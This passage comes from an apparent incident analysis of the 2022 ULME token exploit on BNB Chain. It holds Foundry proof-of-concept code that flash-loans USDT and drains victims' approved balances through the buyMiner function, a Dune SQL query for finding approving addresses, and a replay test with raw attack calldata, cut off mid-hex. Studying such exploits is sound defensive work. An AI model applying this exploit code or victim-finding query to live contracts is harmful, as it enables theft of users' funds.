+</span><span id="__span-1-156"><a id="__codelineno-1-156" name="__codelineno-1-156" href="#__codelineno-1-156"></a><span class="w">        </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>victims<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-157"><a id="__codelineno-1-157" name="__codelineno-1-157" href="#__codelineno-1-157"></a><span class="w">            </span><span class="kt">address</span><span class="w"> </span><span class="nv">victim</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>victims<span class="p">[</span>i<span class="p">];</span>
+</span><span id="__span-1-158"><a id="__codelineno-1-158" name="__codelineno-1-158" href="#__codelineno-1-158"></a><span class="w">            </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">allowance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>allowance<span class="p">(</span>victim<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>ulme<span class="p">));</span>
+</span><span id="__span-1-159"><a id="__codelineno-1-159" name="__codelineno-1-159" href="#__codelineno-1-159"></a><span class="w">            </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>victim<span class="p">);</span>
+</span><span id="__span-1-160"><a id="__codelineno-1-160" name="__codelineno-1-160" href="#__codelineno-1-160"></a><span class="w">            </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">available</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balance<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>allowance<span class="w"> </span><span class="o">?</span><span class="w"> </span>balance<span class="w"> </span><span class="o">:</span><span class="w"> </span>allowance<span class="p">;</span><span class="w"> </span><span class="c1">// available USDT</span>
+</span><span id="__span-1-161"><a id="__codelineno-1-161" name="__codelineno-1-161" href="#__codelineno-1-161"></a>
+</span><span id="__span-1-162"><a id="__codelineno-1-162" name="__codelineno-1-162" href="#__codelineno-1-162"></a><span class="w">            </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>available<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-163"><a id="__codelineno-1-163" name="__codelineno-1-163" href="#__codelineno-1-163"></a><span class="w">                </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>available<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="m m-Decimal">11</span><span class="p">;</span><span class="w"> </span><span class="c1">// according to the buyMiner function, *10/11 to drain all USDT</span>
+</span><span id="__span-1-164"><a id="__codelineno-1-164" name="__codelineno-1-164" href="#__codelineno-1-164"></a><span class="w">                </span>ulme<span class="p">.</span>buyMiner<span class="p">(</span>victim<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
+</span><span id="__span-1-165"><a id="__codelineno-1-165" name="__codelineno-1-165" href="#__codelineno-1-165"></a><span class="w">                </span>loss<span class="w"> </span><span class="o">+=</span><span class="w"> </span>available<span class="p">;</span>
+</span><span id="__span-1-166"><a id="__codelineno-1-166" name="__codelineno-1-166" href="#__codelineno-1-166"></a><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-167"><a id="__codelineno-1-167" name="__codelineno-1-167" href="#__codelineno-1-167"></a><span class="w">                </span>emit<span class="w"> </span>log_named_address<span class="p">(</span><span class="s2">&quot;Insufficient USDT&quot;</span><span class="p">,</span><span class="w"> </span>victim<span class="p">);</span>
+</span><span id="__span-1-168"><a id="__codelineno-1-168" name="__codelineno-1-168" href="#__codelineno-1-168"></a><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-1-169"><a id="__codelineno-1-169" name="__codelineno-1-169" href="#__codelineno-1-169"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-1-170"><a id="__codelineno-1-170" name="__codelineno-1-170" href="#__codelineno-1-170"></a><span class="w">        </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total loss USDT&quot;</span><span class="p">,</span><span class="w"> </span>loss<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-1-171"><a id="__codelineno-1-171" name="__codelineno-1-171" href="#__codelineno-1-171"></a>
+</span><span id="__span-1-172"><a id="__codelineno-1-172" name="__codelineno-1-172" href="#__codelineno-1-172"></a><span class="w">        </span>ULME2USDT<span class="p">();</span>
+</span><span id="__span-1-173"><a id="__codelineno-1-173" name="__codelineno-1-173" href="#__codelineno-1-173"></a>
+</span><span id="__span-1-174"><a id="__codelineno-1-174" name="__codelineno-1-174" href="#__codelineno-1-174"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo7<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-175"><a id="__codelineno-1-175" name="__codelineno-1-175" href="#__codelineno-1-175"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-1-176"><a id="__codelineno-1-176" name="__codelineno-1-176" href="#__codelineno-1-176"></a><span class="p">}</span>
+</span><span id="__span-1-177"><a id="__codelineno-1-177" name="__codelineno-1-177" href="#__codelineno-1-177"></a>
+</span><span id="__span-1-178"><a id="__codelineno-1-178" name="__codelineno-1-178" href="#__codelineno-1-178"></a><span class="kt">function</span><span class="w"> </span><span class="nv">DVMFlashLoanCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">baseAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">quoteAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-179"><a id="__codelineno-1-179" name="__codelineno-1-179" href="#__codelineno-1-179"></a><span class="w">    </span>dodoCall<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>baseAmount<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">,</span><span class="w"> </span>data<span class="p">);</span>
+</span><span id="__span-1-180"><a id="__codelineno-1-180" name="__codelineno-1-180" href="#__codelineno-1-180"></a><span class="p">}</span>
+</span><span id="__span-1-181"><a id="__codelineno-1-181" name="__codelineno-1-181" href="#__codelineno-1-181"></a>
+</span><span id="__span-1-182"><a id="__codelineno-1-182" name="__codelineno-1-182" href="#__codelineno-1-182"></a><span class="kt">function</span><span class="w"> </span><span class="nv">DPPFlashLoanCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">baseAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">quoteAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-183"><a id="__codelineno-1-183" name="__codelineno-1-183" href="#__codelineno-1-183"></a><span class="w">    </span>dodoCall<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>baseAmount<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">,</span><span class="w"> </span>data<span class="p">);</span>
+</span><span id="__span-1-184"><a id="__codelineno-1-184" name="__codelineno-1-184" href="#__codelineno-1-184"></a><span class="p">}</span>
+</span><span id="__span-1-185"><a id="__codelineno-1-185" name="__codelineno-1-185" href="#__codelineno-1-185"></a>
+</span><span id="__span-1-186"><a id="__codelineno-1-186" name="__codelineno-1-186" href="#__codelineno-1-186"></a><span class="kt">function</span><span class="w"> </span><span class="nv">USDT2ULME</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-187"><a id="__codelineno-1-187" name="__codelineno-1-187" href="#__codelineno-1-187"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-1-188"><a id="__codelineno-1-188" name="__codelineno-1-188" href="#__codelineno-1-188"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">);</span>
+</span><span id="__span-1-189"><a id="__codelineno-1-189" name="__codelineno-1-189" href="#__codelineno-1-189"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>ulme<span class="p">);</span>
+</span><span id="__span-1-190"><a id="__codelineno-1-190" name="__codelineno-1-190" href="#__codelineno-1-190"></a><span class="w">    </span>pancakeRouter<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span>
+</span><span id="__span-1-191"><a id="__codelineno-1-191" name="__codelineno-1-191" href="#__codelineno-1-191"></a><span class="w">        </span><span class="err">1</span>_000_000<span class="w"> </span>ether<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>path<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="k">block.timestamp</span>
+</span><span id="__span-1-192"><a id="__codelineno-1-192" name="__codelineno-1-192" href="#__codelineno-1-192"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-1-193"><a id="__codelineno-1-193" name="__codelineno-1-193" href="#__codelineno-1-193"></a><span class="p">}</span>
+</span><span id="__span-1-194"><a id="__codelineno-1-194" name="__codelineno-1-194" href="#__codelineno-1-194"></a>
+</span><span id="__span-1-195"><a id="__codelineno-1-195" name="__codelineno-1-195" href="#__codelineno-1-195"></a><span class="kt">function</span><span class="w"> </span><span class="nv">ULME2USDT</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-196"><a id="__codelineno-1-196" name="__codelineno-1-196" href="#__codelineno-1-196"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-1-197"><a id="__codelineno-1-197" name="__codelineno-1-197" href="#__codelineno-1-197"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>ulme<span class="p">);</span>
+</span><span id="__span-1-198"><a id="__codelineno-1-198" name="__codelineno-1-198" href="#__codelineno-1-198"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">);</span>
+</span><span id="__span-1-199"><a id="__codelineno-1-199" name="__codelineno-1-199" href="#__codelineno-1-199"></a><span class="w">    </span>pancakeRouter<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span><span class="w"> </span><span class="c1">// ULME token has transfer fees</span>
+</span><span id="__span-1-200"><a id="__codelineno-1-200" name="__codelineno-1-200" href="#__codelineno-1-200"></a><span class="w">        </span>ulme<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="p">,</span><span class="w"> </span><span class="c1">// can not swap all, according to the transactionFee function</span>
+</span><span id="__span-1-201"><a id="__codelineno-1-201" name="__codelineno-1-201" href="#__codelineno-1-201"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-1-202"><a id="__codelineno-1-202" name="__codelineno-1-202" href="#__codelineno-1-202"></a><span class="w">        </span>path<span class="p">,</span>
+</span><span id="__span-1-203"><a id="__codelineno-1-203" name="__codelineno-1-203" href="#__codelineno-1-203"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
+</span><span id="__span-1-204"><a id="__codelineno-1-204" name="__codelineno-1-204" href="#__codelineno-1-204"></a><span class="w">        </span><span class="k">block.timestamp</span>
+</span><span id="__span-1-205"><a id="__codelineno-1-205" name="__codelineno-1-205" href="#__codelineno-1-205"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-1-206"><a id="__codelineno-1-206" name="__codelineno-1-206" href="#__codelineno-1-206"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Initially, a significant amount of USDT was flashloaned from seven DODO pools. Subsequently, the attacker exchanged the borrowed USDT for approximately 5232k ULME tokens from PancakeSwap pools. Then, they used the vulnerable <code>buyMiner</code> function to exchange victim's USDT for ULME tokens, artificially inflating the price. Finally, the attacker converted ULME tokens back to USDT, repaying the borrowed funds, resulting in a profit of approximately 50k USDT.</p>
+<p>A few important points to note include the following logic from the <code>buyMiner</code> function:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>usdt<span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>add<span class="p">(</span>usdt<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">10</span><span class="p">));</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kt">require</span><span class="p">(</span>IERC20<span class="p">(</span>_usdt_token<span class="p">).</span>transferFrom<span class="p">(</span>user<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>usdt<span class="p">),</span><span class="w"> </span><span class="s2">&quot;buyUlm: transferFrom to ulm error&quot;</span><span class="p">);</span>
+</span></code></pre></div>
+<p>To use all of the victim's USDT for ULME token exchange, the parameter passed should be <code>available*10/11</code>. In the <code>buyMiner</code> function, this is adjusted again by <code>*11/10</code> to fully utilize the USDT.</p>
+<p>In the ULME contract's <code>_transfer</code> function, it first calls the <code>transactionFee</code> function, indicating that there is a transaction fee for ULME contract transfers. Therefore, when exchanging USDT for ULME, the PancakeRouter's <code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code> function should be used.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transfer</span><span class="p">(</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">from</span><span class="p">,</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">,</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span>amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>transactionFee<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>to<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span>super<span class="p">.</span>_transfer<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>to<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Additionally, within the <code>transactionFee</code> function, there is the following code:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kt">require</span><span class="p">(</span>balanceOf<span class="p">(</span>from<span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>amount<span class="p">,</span><span class="w"> </span><span class="s2">&quot;balanceOf is Insufficient&quot;</span><span class="p">);</span>
+</span></code></pre></div>
+<p>Therefore, the amount of ULME tokens passed in the exchange should not deplete the entire balance.</p>
+<h3 id="attack-flow">Attack Flow</h3>
+<p>Analyzing the entire attack flow for the <a href="https://bscscan.com/address/0x056c20ab7e25e4dd7e49568f964d98e415da63d3">attacker's address</a>.</p>
+<p><img alt="Attack Flow" src="../../image/221025_ULME.assets/0115.png" /></p>
+<p>First, on October 25th, at approximately 8:12 AM, the attacker used Tornado Cash to deposit 1 BNB as initial capital for the attack.
+<img alt="Attack Flow" src="../../image/221025_ULME.assets/0218.png" /></p>
+<p>About 5 minutes later, the attacker created the attack contract used for the exploit.</p>
+<p><img alt="Attack Flow" src="../../image/221025_ULME.assets/0412.png" /></p>
+<p>Two minutes after that, the attacker called the deployed attack contract to initiate the attack. Subsequently, they exchanged the obtained USDT for approximately 184 BNB and, in the end, withdrew the funds using Tornado Cash, completing the entire attack process.</p>
+<h2 id="misc">Misc</h2>
+<h3 id="ulme-token">ULME Token</h3>
+<p>Regarding the vulnerable ULME token, apart from this attack, there doesn't seem to be much information available.</p>
+<p>The <a href="https://bscscan.com/tx/0xd0fa63b9f78f320f049b7d47c4d6c127303090438b671a8c399e95800d5eb27d">transaction creating the token contract</a> has <code>msg.sender</code> as <a href="https://bscscan.com/address/0x4a005e5e40ce2b827c873ca37af77e6873e37203">0x4A005e5E40Ce2B827C873cA37af77e6873e37203</a>, and the <code>dis</code> parameter is a <a href="https://bscscan.com/address/0x096b8f93a642dbb5e8162d9d618fac2cea6f2c2d">contract address</a>. In block <a href="https://bscscan.com/block/22314002">22314002</a>, the token contract creator sent a <a href="https://bscscan.com/tx/0x01cb90ac3741611863c1a4c64939ccf80372805dc4828738e3113068fbdfbad1">transaction</a> that called the <code>dis</code> contract and set variables like <code>roter</code>, <code>sell</code>, and <code>usdt_token</code>.</p>
+<p>Upon closer examination of related contracts, some have Chinese comments, suggesting that this might be a project from China. It's not entirely clear, and there could be many tokens associated with these addresses.</p>
+<h3 id="victims">Victims</h3>
+<p>An important condition for this attack was the need to obtain many addresses that had approved the vulnerable contract for spending their USDT (victims). Websites like Etherscan only provide functionality for checking <a href="https://info.etherscan.com/tokenapprovals/">Token Approval</a> for a specific address. It is speculated that the attacker might have used tools like Dune Analytics or nodes to query approval data.</p>
+<p>For example, using the following SQL query in Dune Analytics, it is possible to retrieve the most recent 100 addresses that approved the ULME contract to spend their USDT:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="n">evt_block_time</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="k">timestamp</span><span class="p">,</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="n">evt_tx_hash</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">transaction_hash</span><span class="p">,</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="k">owner</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="k">owner</span><span class="p">,</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span><span class="n">spender</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">spender</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="k">FROM</span><span class="w"> </span><span class="n">bep20usdt_bnb</span><span class="p">.</span><span class="n">BEP20USDT_evt_Approval</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="k">WHERE</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">  </span><span class="n">spender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">xAE975a25646E6eB859615d0A147B909c13D31FEd</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">evt_block_time</span><span class="w"> </span><span class="k">DESC</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="k">LIMIT</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span>
+</span></code></pre></div>
+<h3 id="frontrunning-protection">Frontrunning Protection</h3>
+<p>Typically, attack contracts include code to prevent frontrunning.</p>
+<p>As observed in AttackTx, it appears that the first step after calling the attack contract is signature verification, likely implemented to prevent frontrunning.</p>
+<p><img alt="Frontrunning Protection" src="../../image/221025_ULME.assets/1706.png" /></p>
+<p>Upon decompilation, a detailed analysis of the <a href="https://bscscan.com/address/0x8523c7661850d0da4d86587ce9674da23369ff26">attack contract</a> deployed by the attacker can be seen.</p>
+<p>It verifies the signature passed as a parameter and requires it to match <code>msg.sender</code>, making it difficult to directly replay the attack by simply copying the parameters. A replay would require generating a new signature.</p>
+<p><img alt="Frontrunning Protection" src="../../image/221025_ULME.assets/0037.png" /></p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testFrontrun</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">22476695</span><span class="p">;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">attackContract</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x8523C7661850D0Da4D86587ce9674DA23369fF26</span><span class="p">;</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">attacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x056c20Ab7E25e4dd7E49568f964d98E415da63D3</span><span class="p">;</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span>attacker<span class="p">);</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">balance0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>attacker<span class="p">);</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>data<span class="w"> </span><span class="o">=</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">        </span>hex<span class="s2">&quot;016ccafe00000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000d60000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000650000000000000000000000004a005e5e40ce2b827c873ca37af77e6873e372030000000000000000000000005ece8a3382fd5317eba6670cae2f70cca8845859000000000000000000000000065d5bfb0bdeada1637974f76acf54428d61c45d0000000000000000000000000c678244aaed33b6c963c2d6b14950d35eab899f0000000000000000000000001f0d9584bc8729ec139ed5befe0c8677994fcb350000000000000000000000006b8cdc12e9e2f5b3620ffb12c04c5e7b0990aaf2000000000000000000000000a9882080e01f8fd11fa85f05f7c7733d1c9837df0000000000000000000000001dfbbecc9304f73cad14c3785f25c1d1924acb0b0000000000000000000000000b038f3e5454aa745ff029706656fed638d5f73a0000000000000000000000000bd084decfb04237e489cad4c8a559fc5ce44f900000000000000000000000005eb2e4907f796c9879181041ff633f33f8858d930000000000000000000000000de272ef3273d49eb608296a783dbd36488d3989000000000000000000000000ae800360ac329cea761afda2d3d55bd12932ab62000000000000000000000000f7726ca96bf1cee9c6dc568ad3a801e637d10076000000000000000000000000847aa967534c31b47d46a2eef5832313e36b25e20000000000000000000000006c91da0dc1e8ab02ab1ab8871c5ae312ef04273b000000000000000000000000b14018024600ee3c747be98845c8536994d40a5d0000000000000000000000008ecdd8859aa286c6bae1f570eb0105457fd24cd20000000000000000000000006ff1c499c13548ee5c9b1ea6d366a5e11eca60ca000000000000000000000000c02eb88068a40aee6e4649bdc940e0f792e16c22000000000000000000000000a2d5b4de4cb10043d190aae23d1efc02e31f1cb60000000000000000000000005e05b8ac4494476dd539e0f4e1302806ec52ed6f000000000000000000000000deb6fdca49e54c8b0704c5b3f941ed63191398160000000000000000000000000e6533b8d6937cc8b4c9be31c00acbfacb6760a5000000000000000000000000ce0fd72a7cf07eb9b20562bbb142cb711a42867f0000000000000000000000004868725bf6d395148def99e6c43074c774e7ac1d0000000000000000000000002f1f2baf34703d16bcfd62cf64a7a5a44ad6c9d40000000000000000000000003d49bdf065f009621a02c5fd88f72ed0a39105210000000000000000000000006e31c08f1938be5df98f8968747bb34802d76e500000000000000000000000004f741d8dcdedd74dadea6cd3a7e41ecb280762090000000000000000000000005480c14b9841c89527f0d1a55ddc0d273aae3609000000000000000000000000b3725da113effd7f39be62a5e349f26e82a949ff0000000000000000000000009d83dee089a5fbfb5f2f1268edb80aea8ba5af160000000000000000000000000c02f3d6962245e934a3fe415eaba6bf570c18830000000000000000000000000182cfefb268dd510ee77f32527578beac6238e200000000000000000000000078598ac3943454682477852e846532f73d5cfe5f000000000000000000000000d067c7585425e1e5aa98743bda5fb652127514760000000000000000000000003507ddf8b74daed03fe76ee74b7d6544f3b254b7000000000000000000000000eca4fd6b05e5849aaf5f2bee5eb3b50f8c4f4e3c000000000000000000000000aa279af072080f3e453a916b77862b4ff6eb245e0000000000000000000000004e505a21325a6820e2099bbd15f6832c6f696a3c000000000000000000000000a5b63f7b40a5cc5ee6b9db7cef2415699627ee890000000000000000000000003dd624ced432ddc32fa0afdae855b76aa143164400000000000000000000000017f217fdeff7ee4a81a4b2f42c695edc2080695700000000000000000000000041819f36878d15a776225928cd52dc56accfd55300000000000000000000000061ca76703c5af052c9b0acc2bab0276875ddd3280000000000000000000000002956bcc87450b424c7305c4c6cf771196c23a52e00000000000000000000000003be05224803c89f3b8c806d887fd84a20d16e5c0000000000000000000000003c97320bf030c2c120fdce19023a571f3fbb6184000000000000000000000000c52021150ca5c32253220be328ddc05f86d3a6190000000000000000000000006d7aaa35c4b2dbd6f1e979e04884aee1b4fbb4070000000000000000000000007c80162197607312ec99d7c9e34720b3572d6d1600000000000000000000000015d92c909826017ff0184eea3e38c36489517a7c000000000000000000000000c07fa7a1f14a374d169dc593261843b4a6d9c1c30000000000000000000000004b415f48fa70a9a0050f6380e8437902609738080000000000000000000000009ceeeb927b85d4bd3b4e282c17eb186bcdc4dd150000000000000000000000000eb76daf60bdf637fc207bfb545b546d5ee208b100000000000000000000000096d7f1660e708eddf2b6f655adb61686b59